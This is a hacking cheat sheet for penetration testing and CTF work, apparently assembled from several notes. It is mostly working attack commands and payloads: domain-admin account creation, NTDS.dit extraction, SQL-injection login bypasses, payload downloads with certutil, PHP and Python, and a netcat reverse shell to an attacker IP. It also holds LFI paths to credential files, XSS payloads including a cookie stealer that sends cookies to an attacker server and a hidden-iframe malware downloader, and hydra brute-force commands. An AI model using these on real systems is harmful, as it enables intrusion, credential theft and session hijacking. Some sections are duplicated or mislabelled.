------------------------------------------------------------

```bash
Use ‚Äònot powershell‚Äô [https://github.com/Ben0xA/nps](https://github.com/Ben0xA/nps)
```

Persistence
------------------------------------------------------------

```bash
net user username "password" /ADD
```

```bash
net group "Domain Admins" %username% /DOMAIN /ADD
```

Gather NTDS.dit file
------------------------------------------------------------

```bash
ntdsutil
```

```bash
activate instance ntds
```

```bash
ifm
```

```bash
create full C:\ntdsutil
```

```bash
quit
```

```bash
quit
```

SQLInjections
------------------------------------------------------------

Common Injections for Login Forms:
------------------------------------------------------------

```bash
admin' --
```

```bash
admin' #
```

```bash
admin'/*
```

```bash
' or 1=1--
```

```bash
' or 1=1#
```

```bash
' or 1=1/*
```

```bash
') or '1'='1--
```

```bash
') or ('1'='1‚Äî
```

Uploading Files to Target Machine
------------------------------------------------------------

TFTP

```bash
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
```

FTP

```bash
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
```

CertUtil (download file from windows)

```bash
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
me
```

PHP

```bash
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
```

Python

```bash
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

HTTP: Powershell

```bash
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

HTTP: Linux

```bash
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
```

NetCat

```bash
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
```

Web Application
------------------------------------------------------------

LFI (Local File Inclusion)
------------------------------------------------------------

if we found an LFI, we can check each of those paths,

we can use burpsuite intruder to see all
Useful LFI files
Linux
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/proc/[0-9]*/fd/[0-9]*
/proc/mounts
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
Apache
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
Debian/Ubuntu -> /var/log/apache2/access.log
FreeBSD -> /var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log
MySQL
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
Windows
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt

Situation

```
http://<target>/index.php?parameter=value

```

How to Test
------------------------------------------------------------

```
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index

```

```
http://<target>/script.php?page=../../../../../../../../etc/passwd
OR
http://<target>/script.php?page=..//..//..//..//..//..//../etc/passwd
OR
curl http://<target>/script.php?page=..//..//..//..//..//..//../etc/passwd

```

```
http://<target>/script.php?page=../../../../../../../../boot.ini

```

LFI Payloads
------------------------------------------------------------

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

XSS
------------------------------------------------------------

Reflected
------------------------------------------------------------

Simple test
------------------------------------------------------------

This is a simple test to see what happens, this is not a prove that the field is vuln to xss

<plaintext>

Simple XSS test
------------------------------------------------------------

<script>alert('Found')</script>

"><script>alert(Found)</script>">

<script>alert(String.fromCharCode(88,83,83))</script>

Bypass filter of tag script
------------------------------------------------------------

`" onload="alert(String.fromCharCode(88,83,83))`

" onload="alert('XSS')

bla is not a valid image, so this cause an error

<img src='bla' onerror=alert("XSS")>

Persistent
------------------------------------------------------------

>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";

PHP collector
------------------------------------------------------------

`> cookie.txtchmod 777 cookie.txt`

edit a php page like colector.php as follow:

<?php $cookie=GET['cookie']; $useragent=$_SERVER['HTTP_USER_AGENT']; $file=fopen('cookie.txt', 'a'); fwrite($file,"USER AGENT:$useragent || COOKIE=$cookie\n"); fclose($file);
?>

Script to put in page:

<scritp>new Image().src="http://OUR_SERVER_IP/colector.php?cookie="+document.cookie;</script>

Malware Donwloader via XSS
------------------------------------------------------------

<iframe src="http://OUR_SERVER_IP/OUR_MALWARE" height="0" width="0"></iframe>

How to play Mario with XSS
------------------------------------------------------------

<iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>

<input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>

XSS payloads
------------------------------------------------------------

- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Seclist XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)

MySql Cheat Sheet
------------------------------------------------------------

```bash
mysql -u [username] -p; #connect, you will be asked for password
SHOW DATABASES;
use DB_NAME;
SHOW TABLES;
select * from TABLE;
```

[MySQL cheatsheet](https://devhints.io/mysql)

[MySQL Cheat Sheet](https://www.mysqltutorial.org/mysql-cheat-sheet.aspx)

Misc
------------------------------------------------------------

Linux file permissions
------------------------------------------------------------

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%202.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%202.png)

Linux Cheat Sheet
------------------------------------------------------------

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%203.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%203.png)

[](https://itblogr.com/wp-content/uploads/2020/04/The-Concise-Blue-Team-cheat-Sheets.pdf?fbclid=IwAR2lG6uxX3cMwu4G80Vwl_ZxpddwEPDqsyXb27yw5xjMOnAB1zX9ZEjDl78)

[Hacking Cheat Sheets](https://cheatography.com/tag/hacking/)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%204.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%204.png)

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%205.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%205.png)

vi cheat sheet

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%206.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%206.png)

find cheat sheet
------------------------------------------------------------

![Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%207.png](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%207.png)

Simple Local Web Servers
------------------------------------------------------------

Python local web server command, handy for serving up shells and exploits on an attacking machine.

```bash
python -m SimpleHTTPServer 80
python3 -m http.server
python -m pyftpdlib -p 21 #start a local ftp server with anonymous:anonymouscer

updog

ruby -rwebrick -e "WEBrick::HTTPServer.new
(:Port => 80, :DocumentRoot => Dir.pwd).start"

php -S 0.0.0.0:80
```

Hash Examples
------------------------------------------------------------

Likely just use **hash-identifier** for this but here are some example hashes:

[Untitled](Hacking%20Cheat%20Sheet%2053ddee9781a440ebb77926762047b8b3/Untitled%20Database%202c8912d8c7b747859491d93a41439662.csv)

Text Manipulation
------------------------------------------------------------

[awk](https://www.howtogeek.com/562941/how-to-use-the-awk-command-on-linux/) - command-line text manipulation dynamo
------------------------------------------------------------

```bash
awk -F: '{print $1,$6}' /etc/passwd
    $0: Represents the entire line of text.
    $1: Represents the first field.
    $2: Represents the second field.
    $7: Represents the seventh field.
    $45: Represents the 45th field.
    $NF: Stands for ‚Äúnumber of fields,‚Äù and represents the last field.
    -F (separator string)
```

Sublime Text Editor
------------------------------------------------------------

```jsx
Splitting the Selection into Lines

Select a block of lines, and then split it into many selections, one per line, using:

    Windows/Linux: Ctrl+Shift+L
```

sed cheat sheet
------------------------------------------------------------

![https://s3.studylib.net/store/data/008266685_1-65c7d170c2600d5fd58feafc3611414f.png](https://s3.studylib.net/store/data/008266685_1-65c7d170c2600d5fd58feafc3611414f.png)

Useful links
------------------------------------------------------------

[A cheat-sheet for password crackers](https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers)

[Penetration testing and webapp cheat sheets](https://doxsec.wordpress.com/2017/07/21/penetration-testing-and-webapp-cheat-sheets/)

[The Ultimate List of SANS Cheat Sheets](https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/?utm_medium=Social&utm_source=Twitter&utm_content=EMEA&utm_campaign=Security%20Trends%20Blog)

[](https://www.sans.org/security-resources/posters/blueprint-building-pen-tester/160/download)

[](https://www.sans.org/security-resources/posters/pen-test-pivots-payloads/180/download)

[coreb1t/awesome-pentest-cheat-sheets](https://github.com/coreb1t/awesome-pentest-cheat-sheets)

[Penetrating Testing/Assessment Workflow](https://gist.github.com/jivoi/724e4b4b22501b77ef133edc63eba7b4)

[0DAYsecurity.com - The fastest resource to a proactive security](http://www.0daysecurity.com/pentest.html)

[OSCP Ultimate CheatSheet - ByteFellow](https://www.bytefellow.com/oscp-ultimate-cheatsheet/)

[Linux Privilege Escalation CheatSheet for OSCP - ByteFellow](https://www.bytefellow.com/linux-privilege-escalation-cheatsheet-for-oscp/)

[Windows Privilege Escalation Cheatsheet for OSCP - ByteFellow](https://www.bytefellow.com/windows-privilege-escalation-cheatsheet-for-oscp/)

[Cheat Sheet](https://jok3rsecurity.com/cheat-sheet/)

[CountablyInfinite/oscp_cheatsheet](https://github.com/CountablyInfinite/oscp_cheatsheet)

[OSCP: Developing a Methodology](https://falconspy.medium.com/oscp-developing-a-methodology-32f4ab471fd6)

[Passing OSCP](https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html)

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[](https://storage.googleapis.com/vkmedia-wp-blogg-vk/uploads/uploads/sites/710/2013/08/Linux-101-Hacks.pdf)

ba≈üka bir g√ºn
-------------

overall useful website/tools
-----------------------------

hacktricks.xyz reference book

‚Äì web ‚Äì

[webhook.site](https://webhook.site/) to get request bin
[dirsearch](https://github.com/maurosoria/dirsearch) to brute force directory
[GitTools](https://github.com/internetwache/GitTools) to pull git repo from public website, if .git is exposed
[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) to generate php filter chain
[postman](https://www.postman.com/) to send http requests
[burpsuite](https://portswigger.net/burp/communitydownload) to intercept http request packages
[wireshark](https://www.wireshark.org/) to capture/analyse network traffic
[csp evaluator](https://csp-evaluator.withgoogle.com/) to evaluate CSP

‚Äì rev ‚Äì

[disasm.pro](https://disasm.pro/) to disassemble bytecode online
[fernflower](https://github.com/fesh0r/fernflower) to decompile java bytecode, made by JetBrains
[angr](https://github.com/angr/angr) to get solution of input or sth

‚Äì misc ‚Äì

[z3](https://github.com/Z3Prover/z3) to find solution under constrains
[dcode](https://www.dcode.fr/en) to decode anything
[CyberChef](https://gchq.github.io/CyberChef/) combine multiple tools to do sth
[pylingual](https://pylingual.io/) decompiling pyc file

‚Äì forensics / osint ‚Äì

[saucenao](https://saucenao.com/) to search for image source
[aperisolve.com](https://www.aperisolve.com/) do stego for image online
[photo-forensics](https://29a.ch/photo-forensics/) do stego for image online
[stegseek](https://github.com/RickdeJager/stegseek) crack jpeg password
[exiftool](https://github.com/exiftool/exiftool) print out EXIF
[maigret](https://github.com/soxoj/maigret) to search for social media account, one of forks of sherlock
[F5](https://github.com/matthewgao/F5-steganography) a common F5 implementation
[autopsy](https://github.com/sleuthkit/autopsy) a GUI tool for forensics
[volatility](https://github.com/volatilityfoundation/volatility) a CLI tool for forensics memory dump
[zsteg](https://github.com/zed-0xff/zsteg) to do stego for PNG/BMP
[png chunk checker](https://www.nayuki.io/page/png-file-chunk-inspector)
[binwalk](https://github.com/ReFirmLabs/binwalk)

‚Äì crypto ‚Äì

[RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) to attack RSA
[hashclash](https://github.com/cr-marcstevens/hashclash) for MD5 collision
[hashcat](https://github.com/hashcat/hashcat) to attack hash
[yafu](https://github.com/bbuhrow/yafu) to factorize number
[John the Ripper](https://github.com/openwall/john) jumbo to crack password

‚Äì pwn ‚Äì

[checksec.sh]() to check binary security properties
[gef](https://github.com/hugsy/gef) very useful GDB plugin / [gdb-dashboard](https://github.com/cyrus-and/gdb-dashboard) Modular visual interface for GDB
[pwntools](https://github.com/Gallopsled/pwntools) utility for pwn in python
[shellcheck](https://www.shellcheck.net/) check fault in shell script
[rp](https://github.com/0vercl0k/rp/) fast ROP gadget finder
[compiler explorer](https://godbolt.org/) Online code to assembly
[Opcode and Instruction Reference Home](http://ref.x86asm.net/geek.html) for 32 and 64 bits
[Syscall Reference](https://hackeradam.com/x86-64-linux-syscalls/) for 64 bits
[dectect it easy](https://github.com/horsicq/Detect-It-Easy/)

‚Äì I don‚Äôt know where to put ‚Äì

[gtfobins](https://gtfobins.github.io/) to search for binaries that can be used to get root shell under certain conditions
[revshells.com](https://www.revshells.com/) to generate reverse shell code
[PEASS-ng](https://github.com/carlospolop/PEASS-ng) to enumerate windows/linux privilege escalation


Web
---

add . dot at the end of domain to bypass simple check [example.com.](example.com.)

DOM Clobbering
--------------

[blink SECCON CTF 2023](https://blog.arkark.dev/2023/09/21/seccon-quals/#web-blink)

ba≈üka bir g√ºn
-------------

Discovery
----------

NMAP
----

Basic nmap scan:
nmap -vv -sC -sV -oN nmap.log $IP

Complete nmap scan:
nmap -vv -A -p- -oN nmap-complete.log $IP

Web Directory and Query Parameters Bruteforce
---------------------------------------------

Using gobuster:
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log -t 200 -u $URL

Using wfuzz:
wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/FUZZ

Using wfuzz to bruteforce query parameters:
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/?parameter=FUZZ

Recursive directory scan with wfuzz:
wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 200 --hc 404 -R $DEPTH http://www.host.name/FUZZ

Web
---

HTTP Form Bruteforce
--------------------

Using Hydra:
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"

Wordpress
---------

WPScan + password bruteforce:
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames usernames.txt

Subdomain Bruteforce
--------------------

Using wfuzz:
wfuzz -c -f wfuzz-sub.log -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $URL -H "Host: FUZZ.host.name" -t 32 --hc 200 --hw 356
Note: you will need to adjust the --hc and --hw parameters to your needs. Check wfuzz -h for more information about those.

Using gobuster:
gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL -t 32


Cracking
--------

ZIP
---

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip

Hashes
------

Using hashcat:
hashcat -m $MODE hashes /usr/share/wordlists/rockyou.txt


Bruteforce SSH
--------------

Using hydra:
hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh

Steganography
-------------

Crack steghide passphrase using stegracker: Install:
pip3 install stegcracker

Run:
python3 -m stegcracker tocrack.jpg

Privescs Discovery
------------------

Find privescs exploiting SUID binaries:
find / -perm -u=s -type f 2>/dev/null

Find privescs by listing sudo permissions:
sudo -l

Enumerate interesting files, processes, and privescs using Linpeas:
Install [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) on your machine.
Transfer it to the target machine.
Make it executable, run it, and tee the output to a log file for further analysis.

chmod +x linpeas.sh
./linpeas.sh | tee linpeas.log

Transferring Files
------------------

Open an HTTP server:
cd into the directory you want to access one or more files from.
Open an HTTP server:
PYTHON3
python3 -m http.server -b $IP $PORT
PHP
php -S $IP:$PORT

Access the file:
----------------
Wget
wget http://$IP:$PORT/file
Curl
curl http://$IP:$PORT/file -o target_file
Netcat
nc $IP $PORT > target_file

Using SCP:
----------

Send
scp /path/to/file user@$HOST:/path/
Send with custom name
scp /path/to/file user@$HOST:/path/different_name
Get
scp user@$HOST:/path/to/file /local/directory

Note: To connect with an SSH key, you may need to use the -i flag followed by the path to the key.

Using netcat:
-------------

Server
nc -nvlp $PORT < file
Client
nc $IP $PORT > file

